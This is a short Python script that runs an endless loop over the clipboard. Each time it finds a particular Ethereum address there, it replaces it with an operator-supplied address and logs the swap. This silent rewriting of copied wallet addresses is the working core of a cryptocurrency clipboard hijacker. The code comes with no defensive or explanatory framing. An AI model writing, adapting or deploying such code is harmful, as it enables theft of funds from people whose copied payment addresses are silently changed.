import pyperclip
import logging
import time

logging.basicConfig(filename='clipboard.log', level=logging.DEBUG)

fake_address = "0x4CAD0c012e3E438d29E2E109Ab572BD7F22aaeA8"
real_address = "YOUR_REAL_ETHERUM_ADDRESS_HERE"

while True:
    try:
        current_clipboard = pyperclip.paste()

        if fake_address in current_clipboard:
            new_clipboard = current_clipboard.replace(fake_address, real_address)
            pyperclip.copy(new_clipboard)

            logging.info(f"Replaced fake address {fake_address} with real address {real_address}")
    except Exception as e:
        logging.error(f"An error occurred: {e}")

    time.sleep(1)
